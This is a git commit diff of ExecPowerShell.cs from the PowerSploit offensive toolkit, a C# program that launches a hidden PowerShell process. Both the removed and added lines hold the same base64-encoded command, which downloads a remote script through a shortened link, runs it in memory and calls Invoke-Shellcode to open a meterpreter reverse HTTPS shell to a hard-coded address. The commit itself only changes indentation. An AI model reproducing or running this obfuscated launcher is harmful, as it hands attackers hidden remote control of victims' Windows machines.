1d524084d652cc5ac80b9f4b727a3cc2aa1bd369
Chris Campbell <obscuresec@gmail.com>
2013-07-22 02:39:19 -0400

    Update ExecPowerShell.cs

--- ExecPowerShell.cs
+++ ExecPowerShell.cs
@@ -9,11 +9,11 @@ class PowerSploit
     static void Main(string[] args) 
     {
         System.Diagnostics.Process process = new System.Diagnostics.Process();
-  	    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-	    	startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-	    	startInfo.FileName = "powershell.exe";
-		    startInfo.Arguments = "-nop -nol -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwAxADQAYgBaAFoAMABjACcAKQA7ACAASQBuAHYAbwBrAGUALQBTAGgAZQBsAGwAYwBvAGQAZQAgAC0AUABhAHkAbABvAGEAZAAgAHcAaQBuAGQAbwB3AHMALwBtAGUAdABlAHIAcAByAGUAdABlAHIALwByAGUAdgBlAHIAcwBlAF8AaAB0AHQAcABzACAALQBMAGgAbwBzAHQAIAAxADkAMgAuADEANgA4AC4AMQAuADEANQAgAC0ATABwAG8AcgB0ACAANAA0ADMAIAAtAEYAbwByAGMAZQA=";
-		    process.StartInfo = startInfo;
-		    process.Start();
+  	System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+	startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+	startInfo.FileName = "powershell.exe";
+	startInfo.Arguments = "-nop -nol -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwAxADQAYgBaAFoAMABjACcAKQA7ACAASQBuAHYAbwBrAGUALQBTAGgAZQBsAGwAYwBvAGQAZQAgAC0AUABhAHkAbABvAGEAZAAgAHcAaQBuAGQAbwB3AHMALwBtAGUAdABlAHIAcAByAGUAdABlAHIALwByAGUAdgBlAHIAcwBlAF8AaAB0AHQAcABzACAALQBMAGgAbwBzAHQAIAAxADkAMgAuADEANgA4AC4AMQAuADEANQAgAC0ATABwAG8AcgB0ACAANAA0ADMAIAAtAEYAbwByAGMAZQA=";
+	process.StartInfo = startInfo;
+	process.Start();
     }
 }
